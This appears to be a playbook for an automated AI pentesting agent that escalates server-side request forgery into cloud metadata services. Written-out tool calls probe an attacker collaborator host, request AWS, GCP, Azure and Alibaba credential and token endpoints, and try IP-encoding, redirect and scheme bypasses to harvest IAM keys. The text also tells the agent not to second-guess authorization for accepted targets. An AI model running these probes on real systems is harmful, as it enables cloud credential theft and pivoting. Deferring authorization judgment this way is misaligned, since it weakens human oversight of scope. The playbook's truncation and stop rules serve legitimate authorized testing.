# C9_ssrf_to_imds

Walk Server-Side Request Forgery probes from echo-style confirmation all the way to cloud Instance Metadata Service (IMDS) endpoints across AWS, GCP, Azure, and Alibaba Cloud. Confirmed IMDS access yields IAM credentials, instance identity, and environment secrets — commonly a critical finding. Scope is enforced by the daemon's egress proxy; the agent does not need to second-guess authorization for accepted targets.

---

## When to use

- Surface accepts a URL, hostname, or IP as user input: webhook URL, import-from-URL, avatar-from-URL, PDF generator, link-preview, XML external entity reference, or server-side URL fetch.
- Traffic or JS analysis reveals params: `url`, `target`, `endpoint`, `src`, `uri`, `redirect`, `callback`, `webhook`, `fetch`, `path`, `remote`.
- Bug-class hints include `ssrf`, `imds`, `metadata`, or `internal-service`.
- DNS rebinding or HTTP redirect chaining is in scope (no `block_internal_hosts: true` constraint).

---

## Workflow

1. **Load assignment and locate URL-parameter endpoints.**
   ```
   mantis_read_hunter_brief({ target_domain, wave, agent, egress_profile, block_internal_hosts })
   ```
   If `block_internal_hosts: true` is set, only test echo/DNS-confirm SSRF; do not probe IMDS IPs.
   Enumerate all endpoints accepting URL-like inputs from traffic summary and recon.

2. **Echo / DNS confirm SSRF.**
   Submit an attacker-controlled HTTP URL as input:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/webhook/register", body: { url: "http://attacker-collab.example.com/ssrf-probe" }, auth_profile: "attacker", egress_profile })
   ```
   Confirm an inbound HTTP request to the collaborator endpoint. This establishes the SSRF primitive. Record DNS-only hits as `info` (not standalone finding); proceed to HTTP-level confirmation before escalating.

3. **Internal network probing.**
   With confirmed SSRF, probe common internal addresses and ports:
   - `http://localhost/` — loopback
   - `http://127.0.0.1/` and `http://[::1]/` — IPv6 loopback
   - `http://0.0.0.0/` — wildcard listener
   - `http://169.254.169.254/` — AWS/GCP/Azure IMDS (link-local)
   - `http://100.100.100.200/` — Alibaba Cloud IMDS
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/import", body: { url: "http://169.254.169.254/" }, auth_profile: "attacker", egress_profile })
   ```
   Observe whether the response body contains cloud-provider metadata fragments.

4. **AWS IMDS — credential harvest.**
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/import", body: { url: "http://169.254.169.254/latest/meta-data/" }, auth_profile: "attacker", egress_profile })
   mantis_http_scan({ target_domain, method: "POST", path: "/api/import", body: { url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }, auth_profile: "attacker", egress_profile })
   ```
   If the instance role name is returned, fetch the credential object:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/import", body: { url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME" }, auth_profile: "attacker", egress_profile })
   ```
   The response contains `AccessKeyId`, `SecretAccessKey`, and `Token`. Record immediately as critical finding.
   Also fetch: `user-data`, `public-keys/0/openssh-key`, `placement/region`.

5. **IMDSv2 token negotiation (AWS).**
   If direct IMDSv1 is blocked, attempt IMDSv2 by first obtaining a session token:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/fetch", body: { url: "http://169.254.169.254/latest/api/token", method: "PUT", headers: { "X-aws-ec2-metadata-token-ttl-seconds": "21600" } }, auth_profile: "attacker", egress_profile })
   ```
   If the token is returned in the application's SSRF response body, use it in a subsequent metadata fetch.

6. **GCP IMDS.**
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/import", body: { url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", headers: { "Metadata-Flavor": "Google" } }, auth_profile: "attacker", egress_profile })
   ```
   Also probe: `project/project-id`, `instance/attributes/kube-env`, `instance/service-accounts/default/email`.

7. **Azure IMDS.**
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/import", body: { url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", headers: { "Metadata": "true" } }, auth_profile: "attacker", egress_profile })
   mantis_http_scan({ target_domain, method: "POST", path: "/api/import", body: { url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", headers: { "Metadata": "true" } }, auth_profile: "attacker", egress_profile })
   ```

8. **Alibaba Cloud IMDS.**
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/import", body: { url: "http://100.100.100.200/latest/meta-data/ram/security-credentials/" }, auth_profile: "attacker", egress_profile })
   ```

9. **SSRF filter bypass attempts.**
   If direct IPs are blocked, try bypass variants:
   - Decimal encoding: `http://2130706433/` (127.0.0.1 in decimal)
   - Octal: `http://0177.0.0.1/`
   - Hex: `http://0x7f000001/`
   - IPv6 mapped: `http://[::ffff:169.254.169.254]/`
   - DNS rebinding: point attacker-controlled domain to 169.254.169.254 at response time
   - HTTP redirect: attacker host returns `301 Location: http://169.254.169.254/...`
   - URL scheme alternatives: `dict://`, `gopher://`, `file://`, `ldap://`
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/import", body: { url: "http://2130706433/" }, auth_profile: "attacker", egress_profile })
   ```

10. **Log coverage.**
    ```
    mantis_log_coverage({ target_domain, wave, agent, surface_id, entries: [{ endpoint: "/api/import", method: "POST", bug_class: "ssrf_imds", auth_profile: "attacker", status: "promising"|"tested", evidence_summary: "SSRF confirmed; 169.254.169.254 IMDS returned IAM role listing" }] })
    ```

11. **Record chain attempt.**
    ```
    mantis_record_chain_attempt({ target_domain, wave, agent, surface_id, chain_id: "ssrf-to-imds-creds", step: "imds_cred_harvested", evidence: "AWS IAM credentials returned via SSRF to 169.254.169.254", outcome: "finding_recorded" })
    ```

12. **Record finding.**
    Call `mantis_list_findings` first:
    ```
    mantis_record_finding({ target_domain, wave, agent, surface_id, auth_profile: "attacker", title: "SSRF to AWS IMDS — IAM credential exfiltration", severity: "critical", cwe: "CWE-918", endpoint: "/api/import", description: "...", proof_of_concept: "<full request/response including AccessKeyId>", response_evidence: "...", impact: "Attacker obtains live AWS IAM credentials; can pivot to S3, EC2, Lambda, etc.", validated: true })
    ```
    Do NOT include the full `SecretAccessKey` or `Token` values in the finding body — truncate after the first 4 chars and note their presence.

13. **Write handoff.**
    ```
    mantis_write_handoff({ target_domain, wave, agent, surface_id, surface_status: "complete"|"partial", summary: "...", chain_notes: ["SSRF-IMDS creds pivot to AWS APIs", "Bypass via decimal IP encoding confirmed"] })
    ```

14. **Open verification attempt.**
    ```
    mantis_open_verification_attempt({ target_domain, wave, agent, surface_id, finding_id: "F-N", method: "imds_re_probe", notes: "Re-probe with fresh attacker session; confirm IMDS still accessible without IMDSv2 enforcement" })
    ```

---

## Evidence requirements

Record via `mantis_record_finding`:
- Full SSRF request (URL parameter value, HTTP method, request body) and response body confirming IMDS content.
- Specific IMDS paths that returned data, with response excerpts (truncate credentials after 4 chars).
- DNS confirm evidence if used (collaborator hit timestamp and IP).
- Filter bypass technique used (if applicable) and the specific encoding that succeeded.
- Cloud provider identified from IMDS response structure.

---

## Stop conditions

- All SSRF-capable endpoints blocked for internal IPs and all bypass variants exhausted.
- Application returns only DNS-resolution results (no HTTP-level response body) — record as info-only SSRF.
- `block_internal_hosts: true` is set — stop after echo/DNS confirm; do not probe IMDS.
- Two WAF blocks on SSRF payloads — log, mark WAF-blocked, stop.
- Budget at 140 turns — wrap current test, write handoff.

---

## Failure modes / false positives to avoid

- **DNS-only as critical.** DNS-only SSRF (the server resolves the hostname but makes no HTTP connection) is not a critical finding. Only escalate to high/critical when HTTP-level metadata is returned.
- **Response reflection vs. server fetch.** Some endpoints echo the URL back in an error message without actually fetching it. Confirm with a collaborator HTTP callback or IMDS data in the response body.
- **IMDSv2 as complete mitigation.** IMDSv2 is a mitigation, not elimination. Many applications forward request headers — test whether the server can be tricked into forwarding the IMDSv2 TTL header.
- **Credentials in finding body.** Never record live credentials in plaintext in the finding description or proof_of_concept beyond a 4-char prefix. Truncate and annotate.

---

## Next chain

Feeds into **C12_account_takeover** (use IAM credentials to access account data stores), **C6_jwt_signer_swap** (if jku/x5u SSRF is the vector, pivot to JWT signing key theft), and **C17_cache_poisoning** (if the SSRF response is cached by an intermediate proxy).
